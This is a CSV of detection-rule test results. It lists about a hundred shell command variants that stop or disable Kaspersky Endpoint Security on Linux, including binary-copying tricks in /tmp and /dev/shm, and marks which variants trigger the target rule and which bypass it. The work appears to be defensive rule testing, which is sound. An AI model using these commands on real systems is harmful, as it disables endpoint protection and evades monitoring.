ID,Command,Log File,Result,All Detected Rules
104,"/bin/bash -c ""stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack104.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
105,"/bin/bash -c ""disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack105.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
106,"bash -c ""systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack106.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
108,"bash -c ""stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack108.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
109,"bash -c ""disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack109.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
113,"/bin/bash -c ""kesl stop""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack113.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
114,"/bin/bash -c ""kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack114.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
115,"bash -c ""kesl stop""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack115.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
116,"bash -c ""kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack116.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
118,"/bin/bash -c ""kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack118.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
120,systemctl stop kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack120.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
121,systemctl disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack121.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
124,stop kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack124.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
125,disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack125.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
128,kesl stop,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack128.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
129,kesl disable,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack129.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
130,kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack130.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
132,"/bin/bash -c ""systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack132.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
133,"/bin/bash -c ""stop kesl && disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack133.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
134,"bash -c ""systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack134.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
135,"bash -c ""stop kesl && disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack135.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
136,"/bin/sh -c ""systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack136.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
137,"/bin/sh -c ""disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack137.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
138,"sh -c ""stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack138.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
139,"sh -c ""disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack139.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
140,"sh -c ""systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack140.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
143,/usr/bin/systemctl stop kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack143.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
144,/usr/bin/systemctl disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack144.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
149,"/usr/bin/bash -c ""disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack149.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
150,sudo systemctl stop kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack150.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
151,sudo systemctl disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack151.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
152,"/bin/bash -c ""systemctl disable kesl && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack152.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
153,"/bin/bash -c ""systemctl disable kesl ; systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack153.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
154,"/bin/bash -c ""systemctl stop kesl ; systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack154.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
155,"/bin/bash -c ""systemctl stop kesl && disable kesl systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack155.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
156,"/bin/bash -c ""disable kesl && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack156.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
157,"/bin/bash -c ""disable kesl ; systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack157.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
158,"/bin/bash -c ""stop kesl ; systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack158.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
159,"/bin/bash -c ""disable kesl && stop kesl systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack159.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
160,"/bin/bash -c ""kesl stop && systemctl kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack160.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
161,"/bin/bash -c ""kesl disable && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack161.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
162,"/bin/bash -c ""systemctl kesl stop && systemctl kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack162.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
163,"/bin/bash -c ""kesl systemctl stop && kesl systemctl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack163.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
164,"/bin/bash -c ""systemctl stop kesl && disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack164.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
165,"/bin/bash -c ""disable kesl && systemctl kesl stop""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack165.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
166,"/bin/bash -c ""stop kesl && kesl disable systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack166.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
167,"/bin/bash -c ""stop systemctl kesl && disable kesl systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack167.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
168,"/bin/bash -c ""disable systemctl kesl && stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack168.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
169,"/bin/bash -c ""disable && systemctl stop kesl kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack169.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
170,"/bin/bash -c ""systemctl stop kesl && kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack170.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
171,"/bin/bash -c ""kesl systemctl disable && stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack171.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
172,"/bin/bash -c ""systemctl stop kesl && kesl systemctl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack172.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
173,"/bin/bash -c ""stop kesl && systemctl kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack173.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
174,"/bin/bash -c ""disable systemctl && stop kesl kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack174.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
175,"/bin/bash -c ""disable kesl systemctl && stop systemctl kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack175.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
176,"/bin/bash -c ""kesl systemctl stop && disable systemctl kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack176.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
177,"/bin/bash -c ""stop systemctl kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack177.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
178,"/bin/bash -c ""stop kesl systemctl && disable kesl systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack178.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
179,"/bin/bash -c ""kesl stop systemctl && kesl disable systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack179.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
180,"/bin/bash -c ""kesl stop systemctl && disable kesl systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack180.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
181,"/bin/bash -c ""kesl stop && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack181.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
182,"/bin/bash -c ""disable && kesl stop systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack182.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
183,"/bin/bash -c ""stop && kesl disable systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack183.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
184,"/bin/bash -c ""systemctl kesl disable && stop systemctl kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack184.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
185,"/bin/bash -c ""disable systemctl kesl && kesl stop""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack185.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
186,"/bin/bash -c ""systemctl disable kesl && kesl stop systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack186.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
187,"/bin/bash -c ""systemctl disable kesl && stop kesl systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack187.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
188,"/bin/bash -c ""stop kesl systemctl && kesl systemctl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack188.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
189,"/bin/bash -c ""systemctl stop kesl && kesl systemctl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack189.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
190,"/bin/bash -c ""kesl systemctl stop && disable systemctl kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack190.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
191,"/bin/bash -c ""stop kesl && kesl disable systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack191.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
192,"/bin/bash -c ""systemctl stop kesl && systemctl kesl disable""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack192.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
193,"/bin/bash -c ""systemctl kesl stop && disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack193.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
194,"/bin/bash -c ""kesl stop systemctl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack194.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
195,"/bin/bash -c ""disable kesl systemctl && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack195.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
196,"/bin/bash -c ""systemctl stop kesl && kesl disable systemctl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack196.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
197,"/bin/bash -c ""stop kesl && systemctl disable kesl && echo done""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack197.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
198,"/bin/bash -c ""disable kesl && echo done && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack198.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
199,"/bin/bash -c ""systemctl stop kesl && (systemctl disable kesl)""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack199.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
200,"/bin/bash -c ""(systemctl disable kesl) && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack200.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
201,"/bin/bash -c ""(disable kesl && systemctl stop kesl)""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack201.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
202,cp /bin/systemctl /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack202.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
203,cp /usr/bin/systemctl /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack203.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
204,cp $(which systemctl) /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack204.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
205,"cp /bin/bash /tmp/shx; /tmp/shx -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack205.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
206,install /bin/systemctl /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack206.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
207,cp /bin/systemctl ./svc; ./svc stop kesl && ./svc disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack207.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
208,cp /usr/bin/systemctl ./sys; ./sys stop kesl && ./sys disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack208.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
209,"cp /bin/bash /dev/shx && chmod +x /dev/shx; /dev/shx -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack209.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
210,cp /bin/systemctl /var/tmp/sysx; /var/tmp/sysx stop kesl && /var/tmp/sysx disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack210.log,Bypass Target Rule,System Information Discovery | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
211,cp $(command -v systemctl) ./sc; ./sc stop kesl && ./sc disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack211.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
212,cp /usr/bin/systemctl /tmp/.hidden; /tmp/.hidden stop kesl && /tmp/.hidden disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack212.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
213,"cp /bin/bash /tmp/mybash; /tmp/mybash -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack213.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
214,cp /bin/systemctl /dev/shm/sysd; /dev/shm/sysd stop kesl && /dev/shm/sysd disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack214.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
215,cp /usr/bin/systemctl /var/tmp/x; /var/tmp/x stop kesl && /var/tmp/x disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack215.log,Bypass Target Rule,System Information Discovery | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
216,cp $(which systemctl) /tmp/xyz; /tmp/xyz stop kesl && /tmp/xyz disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack216.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
217,"cp /bin/bash /tmp/bsh; /tmp/bsh -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack217.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
